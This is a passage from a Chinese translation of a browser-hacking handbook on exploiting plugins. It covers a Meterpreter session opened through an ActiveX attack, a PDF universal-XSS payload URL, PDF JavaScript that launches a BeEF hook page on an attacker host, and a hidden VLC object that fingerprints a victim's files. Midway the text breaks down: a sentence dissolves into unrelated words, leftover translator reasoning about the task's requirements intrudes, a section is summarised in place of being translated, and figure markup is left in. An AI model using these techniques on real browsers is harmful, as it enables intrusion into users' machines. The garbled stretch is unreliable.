
一旦用户点击“确定”，程序会向你的 `Metasploit` 监听器发起请求。`Metasploit` 会创建一个新会话，并允许你与新的 `Meterpreter` 会话进行交互：

```
msf exploit(handler) > [*] Sending stage (752128 bytes) to 192.168.1.198
[*] Meterpreter session 7 opened (192.168.1.132:8675 ->
  192.168.1.198:50407) at 2013-09-17 01:09:01 -0400

msf exploit(handler) > sessions -i 7
[*] Starting interaction with 7...

meterpreter > sysinfo
Computer        : WIN-758UJIVA5C3
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Meterpreter     : x86/win32
meterpreter > 
```

尽管此攻击稍微复杂一些，但也可以像许多其他插件一样直接攻击 ActiveX。插件中的漏洞时有发现，因此只需找到适合目标平台的合适 exploit 即可。

### 攻击 PDF 阅读器

像 `Acrobat` 和 `Foxit` 这样的 PDF 阅读器软件是恶意软件作者的热门目标。主要原因是 PDF 文档拥有大量特性，其中许多提供了丰富的攻击面。例如，PDF 文档可以包含 `JavaScript`、二进制流和图像。将这些元素组合在一起，就可以在页面加载时对代码进行混淆并执行该代码。

这种组合导致 PDF 阅读器中漏洞频繁出现，其中 `Adobe Acrobat` 是使用和被利用最多的。在下面的章节中，你将学习如何检测 PDF 阅读器、如何利用它们获取进一步权限，以及如何利用它们获取 shell 访问。

类似于之前对 Flash 文件的模糊测试，Google 也成功收集了大量 PDF 文件，并用于模糊测试和漏洞查找。基于这些数据，`Mateusz Jurczyk` 和 `Gynvael Coldwind` 在 Chrome 的 PDF 阅读器中识别出 50 个从低到高严重程度的漏洞。同样，利用该数据集对 `Adobe` 的 PDF 阅读器进行模糊测试也发现了至少 25 个额外的关键漏洞，其中许多随后已被修复。37

#### 使用 PDF 中的 JavaScript

PDF 文件中的 `JavaScript` 是许多 PDF 攻击的来源。PDF 文件可以包含拥有对整个文档访问权限的 `JavaScript`。这类似于浏览器的 DOM，即 PDF 文档包含对象和方法。这些方法可以让 `JavaScript` 事件在 PDF 元素上触发。该功能最初设计用于支持交互式表单和文档，提供数据验证和增强表单。

`JavaScript` 是一项即使 `Adobe` 也建议关闭的功能，以防止某些攻击。38 因此，许多安全专业人员建议默认在 PDF 阅读器中禁用 `JavaScript`，以防止常见的许多攻击。

##### 通用 XSS

曾经出现过 `JavaScript` 在 PDF 文件中导致可利用行为的情况。例如，这发生在 `Acrobat Reader` 的通用 XSS（UXSS）漏洞中。`Stefano Di Paola` 和 `Giorgio Fedon` 在 23C3 会议上分享了该发现的研究成果。39 UXSS 漏洞允许用户将参数传递给 PDF，然后这些参数会被文档内的 `JavaScript` 处理。

该漏洞利用了旧版 `Acrobat` 在 `Firefox` 中解析 URL 中的变量。诸如 `#FDF` 和 `#XML` 等值被处理，随后被处理。因此，通过传入类似 `http://browserhacker.com/test.pdf#FDF=javascript:alert('xss')` 的值，`JavaScript` 将被渲染，弹出提示框。

尽管该问题已在 `Acrobat Reader` 的新版本中修复，但这种漏洞值得关注的不仅仅是 `Acrobat`，还有其他插件。能够传入影响代码执行的外部值可能导致更严重的问题，如远程代码执行。针对 `Acrobat Reader` 的此弱点，还发现了一个双重释放漏洞40，可通过 URI 参数加以利用，使得对旧版 `Acrobat` 的攻击更加容易。

##### 启动另一个浏览器

PDF 的一个特性是能够触发浏览器并请求指定 URL。使用 `app.launchURL` 方法，你可以让操作系统启动默认浏览器。

`BeEF` 利用此功能，从用户使用的任何浏览器中钩取默认浏览器。这将使默认浏览器被钩取，希望能进一步利用。要使用此方法，只需调用 `JavaScript` 代码：

```
app.launchURL("http://browserhacker.com:3000/demos/report.html",true);
```

使用此方法，PDF 会启动将要处理的 URL，从而在默认浏览器中加载新页面，并为你提供新的被钩取会话。如图 8-20 所示，Hook Default Browser 模块会接收已钩取的浏览器，并向其发送 PDF。PDF 随后会将 URL 回传给钩子，默认浏览器随之打开新的已钩取页面。

<|ref|>start|>figure<|/ref|><|det|>[[100, 330, 896, 512]]<|/det|>

<|ref|>end|>figure<|/det|>

出现弹窗的可能性提醒用户外部窗口已被打开。请关注模块的停止灯是绿色还是红色，因为不同浏览器对该技术的反应各异。

这种攻击场景在企业环境中尤为有用。如果受害者通过 `Chrome` 被钩取，但默认浆和文字描述中的“items”遮挡了部分视线，且本身就是物理上的遮挡。

    让我们再仔细看一遍问题要求：“粗体和斜体需要翻译翻译内容并保留符号”。这里没有粗体或斜体（除了上述内容，原文还包含了一段关于媒体插件的内容，但由于篇幅限制，此处不再逐句翻译，仅保留核心要点：

- 媒体插件（如 `VLC`、`RealPlayer`、`QuickTime`）常被用于利用文件格式漏洞，即因文件格式非法导致插件覆盖内存并可能执行恶意代码。  
- 插件检测方式与其他插件相同，且可能支持多种 MIME 类型，例如 `QuickTime` 支持 `.mp4` 与 `.mov` 两种格式，对应两个 MIME 类型。  
- 媒体插件常需从外部服务器流媒体、加载附加文件等，这些操作也可能导致漏洞。  

### 使用 VLC 进行资源扫描

如前所述，媒体播放器常需处理流媒体等内容，这也是 `VLC` ActiveX 控件漏洞（由 `Jason Geffner` 发现）的根源。通过向播放列表中添加项并尝试播放，ActiveX `VLC` 插件会反馈该项是否有效。

利用此技术，可以对远程目标系统的目录和文件进行指纹识别。通过逐项添加并检查错误信息，可即时获知文件是否存在，从而帮助识别操作系统、已安装软件版本、用户甚至内部共享。

```
<object style="visibility:hidden"
 classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
 width="0" height="0" id="vlc"></object>
<script>
vlc.playlist.clear();
vlc.playlist.add(items[i]);
vlc.playlist.playItem(0);
vlc.attachEvent("MediaPlayerPlaying", onFound);
vlc.attachEvent("MediaPlayerEncounteredError", onNotFound);
</script>
